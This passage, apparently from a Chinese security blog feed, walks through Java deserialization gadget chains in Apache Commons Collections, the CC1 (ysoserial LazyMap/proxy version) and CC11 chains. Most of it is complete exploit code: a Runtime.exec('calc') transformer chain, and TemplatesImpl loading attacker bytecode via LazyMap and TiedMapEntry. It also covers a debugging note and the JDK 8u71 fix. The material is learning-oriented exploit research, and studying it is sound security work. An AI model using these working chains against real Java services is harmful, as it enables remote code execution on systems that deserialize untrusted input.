annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br><span class="hljs-comment">//        UNSER(&quot;ser.bin&quot;);</span><br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ysoserial版本CC1"><a href="#ysoserial版本CC1" class="headerlink" title="ysoserial版本CC1"></a>ysoserial版本CC1</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202238209.png" alt="image-20240523202238209"></p>
<p>其实这后面这部分和TransformMap版本是一样的。我们当时想调用<code>TransformMap.transform()</code>方法，TransformMap版本使用的是<code>TransformMap.checkSetValue()</code>。ysoserial版本使用的是<code>LazyMap.get()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202537062.png" alt="image-20240523202537062"></p>
<p> factory正好传入我们之前的<code>ChainedTransformer</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210551073.png" alt="image-20240523210551073"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210636955.png" alt="image-20240523210636955"></p>
<p>LazyMap的意思是一开始不写key，等调用的时候通过transform()调用key，所以一开始要确保没有key;</p>
<p>接下来就找谁调用了get(),找到了<code>AnnotationInvocationHandler.invoke()</code>，而动态代理类会自动执行invoke方法，过这里的判断很简单，只需要不调用equls方法和不调用有参方法就能过这两个if。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523211936873.png" alt="image-20240523211936873"></p>
<p><code>AnnotationInvocationHandler</code>从名字来看就是动态处理器类又正好<code>AnnotationInvocationHandler.readObject</code> 调用了<code>entrySet()</code>正好撞在枪口上。menberValues又可控。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523212053262.png" alt="image-20240523212053262"></p>
<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span>(InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Target.class, lazyMap );<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, mapProxy);<br><br><br><span class="hljs-comment">//        SER(o);</span><br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523205520055.png" alt="image-20240523205520055"></p>
<h2 id="后续官方修复方式"><a href="#后续官方修复方式" class="headerlink" title="后续官方修复方式"></a>后续官方修复方式</h2><h3 id="对于TransformMap版"><a href="#对于TransformMap版" class="headerlink" title="对于TransformMap版"></a>对于TransformMap版</h3><p>JDK 8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20110816.png" alt="2024-05-24 110816"></p>
<h3 id="对于ysoserial版"><a href="#对于ysoserial版" class="headerlink" title="对于ysoserial版"></a>对于ysoserial版</h3><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240524111729060.png" alt="image-20240524111729060"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20111150.png" alt="2024-05-24 111150"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>
<p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC11</title>
    <url>/2024/06/05/JAVA%E5%AE%89%E5%85%A8/CC11/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前在学习CC2的时候，CC2是CC3+CC4改写的。</p>
<p>从图中就可以看出来，CC6也能走到TemplatesImpl，然后直接加载字节码。</p>
<p>CC2+CC6改写，就是CC11</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
<h2 id="CC11利用链"><a href="#CC11利用链" class="headerlink" title="CC11利用链"></a>CC11利用链</h2><p>之前在<a href="https://sp4rks3.github.io/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/">Java反序列化CommonsCollections篇-CC3</a>中提到利用<code>ClassLoader#defineClass</code>直接加载字节码的方式，在这里可以直接使用。</p>
<p>其实这样的话，直接使用CC2加载恶意字节码的部分结合CC6前面调用的部分就可以组成这条链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>		<br>        <br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//templates.newTransformer();</span><br>		<br>        <span class="hljs-comment">//通过ChainedTransformer加载templates的newTransformer方法</span><br>        <span class="hljs-comment">//CC6</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>		lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这条链最终也是可以改写成不带 Transformer 数组的链。</p>
<h2 id="最终成型的CC11"><a href="#最终成型的CC11" class="headerlink" title="最终成型的CC11"></a>最终成型的CC11</h2><p>这个 <code>LazyMap#get</code> 的参数 key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer 的角色——一个简单的对象传递者。</p>
<p>我们 <code>LazyMap.get(key)</code> 直接调用 <code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用 <code>TempalteImpl.newTransformer()</code> 来完成后续调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br>		<br>		<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);  <span class="hljs-comment">//注意这里有坑</span><br><br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br><br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>当时运行这段代码，可以运行，也没报错，但是计算机并不能弹出来，大体浏览了一边代码感觉没问题。当时卡在这里好久，只能慢慢调试。</p>
<p>直接在<code>TemplatesImpl</code>加载恶意字节码的部分尝试<code>templates.newTransformer()</code>，首先确定了<code>TemplatesImpl</code>加载恶意字节码是能够触发的，那这部分没有问题</p>
<p><code>InvokerTransformer</code>调用的部分我想应该没有问题，那最有可能有问题的其实是<code>Lazymap</code>，看了最上面的图，看到是调用了LazyMap.get()，直接下断点调试</p>
<p>其实和之前CC6的情况是一样的，当LazyMap没key的时候才会调用<code>put()</code>，但是现在的key为<code>templates</code>，结果为<code>map.containsKey(key) == true</code>导致条件判断失败。</p>
<p>解决办法也很简单直接<code>lazymap.clear();</code>或者<code>lazymap.remove(&quot;templates&quot;);</code></p>
<p>(粗心大意导致浪费了很多时间)。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240605205214090.png" alt="image-20240605205214090"></p>
<h3 id="最终链子"><a href="#最终链子" class="headerlink" title="最终链子"></a>最终链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(templates);<br>        <br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br>        <br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/9-CommonsCollections11/CommonsCollections11.md">CommonsCollections11利用链分析</a></p>
